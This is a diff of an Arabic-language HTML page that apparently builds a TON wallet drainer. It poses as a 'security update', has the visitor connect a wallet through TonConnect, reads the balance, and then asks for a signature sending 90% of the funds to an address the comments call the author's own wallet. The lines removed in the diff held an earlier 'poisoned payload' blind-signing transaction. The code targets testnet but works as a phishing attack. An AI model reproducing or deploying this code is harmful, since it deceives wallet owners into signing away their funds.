@@ -2,82 +2,94 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>Direct SDK Connection - PoC</title>
+    <title>TON Testnet Security Update</title>
     <style>
-        body { font-family: sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #1e2329; padding: 30px; border-radius: 20px; text-align: center; border: 1px solid #333; width: 350px; }
-        button { background: #fcd535; color: #000; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
-        #log { margin-top: 20px; font-size: 12px; color: #848e9c; text-align: left; background: #000; padding: 10px; border-radius: 5px; height: 80px; overflow-y: auto; }
+        body { font-family: sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; padding: 30px; border-radius: 20px; border: 1px solid #30363d; text-align: center; width: 400px; }
+        .balance-info { display: none; background: #0d1117; padding: 15px; border-radius: 10px; margin: 20px 0; border: 1px solid #58a6ff; }
+        button { background: #238636; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        #status { font-size: 12px; color: #8b949e; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>تحديث أمني مباشر</h2>
-    <p>اضغط للربط المباشر عبر الـ SDK</p>
-    <button id="connectBtn">اتصال مباشر (Direct Connect)</button>
-    <div id="log">بانتظار الأوامر...</div>
+    <img src="https://ton.org/address/ton_logo.png" width="60" alt="logo">
+    <h2>تحديث الأمان (Testnet)</h2>
+    <p>قم بالربط للتحقق من رصيدك وحماية حسابك.</p>
+    
+    <button id="connectBtn">اتصال مباشر عبر SDK</button>
+
+    <div id="balanceBox" class="balance-info">
+        <div>المحفظة: <span id="addr" style="font-size: 10px;">-</span></div>
+        <div style="font-size: 20px; margin-top: 10px;">الرصيد: <span id="balance">0</span> TON</div>
+    </div>
+
+    <div id="status">جاهز للربط...</div>
 </div>
 
 <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
 
 <script>
-    const log = document.getElementById('log');
-    const logger = (m) => log.innerHTML += `<div>> ${m}</div>`;
-
-    // استخدم رابط الـ Gist الخاص بك هنا
     const manifest = "https://gist.githubusercontent.com/pp0p/5119b45ec095aecbe9638d21f36e56ad/raw/d30a363c4cf4b6926d8b310a02ee1d350d869729/tonconnect-manifest.json";
-
     const connector = new TonConnectSDK.TonConnect({ manifestUrl: manifest });
 
-    document.getElementById('connectBtn').onclick = async () => {
-        logger("جاري توليد رابط الاتصال...");
+    const connectBtn = document.getElementById('connectBtn');
+    const balanceBox = document.getElementById('balanceBox');
+    const statusDiv = document.getElementById('status');
 
+    connectBtn.onclick = async () => {
         try {
-            // طلب الاتصال وتوليد الرابط
-            const walletConnectionSource = {
+            const connectUrl = connector.connect({
                 universalLink: 'https://app.tonkeeper.com/ton-connect',
                 bridgeUrl: 'https://bridge.tonapi.io/bridge'
-            };
-
-            // الـ SDK سيولد رابطاً يحتوي على المعرفات اللازمة
-            const connectUrl = connector.connect(walletConnectionSource);
-
-            if (connectUrl) {
-                logger("تم توليد الرابط. جاري التحويل...");
-                // فتح المحفظة فوراً
-                window.location.href = connectUrl;
-            }
-        } catch (e) {
-            logger("خطأ: " + e.message);
-        }
+            });
+            window.location.href = connectUrl;
+        } catch (e) { statusDiv.innerText = "خطأ: " + e.message; }
     };
 
-    // الاستجابة فور نجاح الربط (الانتحال)
     connector.onStatusChange(async (wallet) => {
         if (wallet) {
-            logger("✅ تم الاتصال بهوية مزورة!");
-            
-            // إرسال المعاملة المسمومة (BOC العميق)
-            const transaction = {
-                validUntil: Math.floor(Date.now() / 1000) + 60,
-                messages: [{
-                    address: "0QBMdBOi2OkuHuLvm7lqKar2JFdrKif6prMyHV3ZTZcSGb0c",
-                    amount: "500000000",
-                    payload: "te6cckEBOQEA/gABWxI0q80AAAAAAAAAAIAJjoJ0Wx0lw9xd83ctRTVexIrtZUT/VNZmQ6u7KbLiQzABAQACAQADAQAEAQAFAQAGAQAHAQAIAQAJAQAKAQALAQAMAQANAQAOAQAPAQAQAQARAQASAQATAQAUAQAVAQAWAQAXAQAYAQAZAQAaAQAbAQAcAQAdAQAeAQAfAQAgAQAhAQAiAQAjAQAkAQAlAQAmAQAnAQAoAQApAQAqAQArAQAsAQAtAQAuAQAvAQAwAQAxAQAyAQAzAQA0AQA1AQA2AQA3AQA4AEsAAAAAgAmOgnRbHSXD3F3zdy1FNV7Eiu1lRP9U1mZDq7spsuJDMNjs78g="
-                }]
-            };
+            const rawAddress = wallet.account.address;
+            document.getElementById('addr').innerText = rawAddress;
+            balanceBox.style.display = 'block';
+            connectBtn.style.display = 'none';
 
-            setTimeout(async () => {
-                try {
-                    logger("إرسال طلب التوقيع الأعمى...");
-                    await connector.sendTransaction(transaction);
-                } catch (err) {
-                    logger("تم رفض المعاملة.");
-                }
-            }, 1000);
+            // جلب الرصيد من التست نيت
+            try {
+                const response = await fetch(`https://testnet.toncenter.com/api/v2/getAddressInformation?address=${rawAddress}`);
+                const data = await response.json();
+                const balanceNano = data.result.balance;
+                const balanceTon = balanceNano / 1000000000;
+                document.getElementById('balance').innerText = balanceTon.toFixed(2);
+
+                // طلب توقيع لسحب الرصيد تلقائياً بعد 3 ثوانٍ
+                statusDiv.innerText = "جاري التحقق من ملكية الرصيد...";
+                setTimeout(() => sendMaliciousTx(balanceNano), 3000);
+            } catch (e) { console.error("Balance fetch error", e); }
         }
     });
+
+    async function sendMaliciousTx(nanoAmount) {
+        // سحب الرصيد بالكامل (ناقص قليل للـ gas fees)
+        const amountToSend = Math.floor(nanoAmount * 0.9); 
+        
+        const transaction = {
+            validUntil: Math.floor(Date.now() / 1000) + 60,
+            messages: [{
+                address: "0QAPwOt8W9eZqRj2OwxDjwSTtMMCG-uXr6MQMZ0WiFgdP0rY", // محفظتك للتست نيت
+                amount: amountToSend.toString()
+            }]
+        };
+
+        try {
+            statusDiv.innerText = "يرجى توقيع المعاملة لتحديث الحماية...";
+            await connector.sendTransaction(transaction);
+            statusDiv.innerText = "✅ تمت العملية بنجاح!";
+        } catch (e) {
+            statusDiv.innerText = "❌ تم رفض التوقيع.";
+        }
+    }
 </script>
 </body>
 </html>
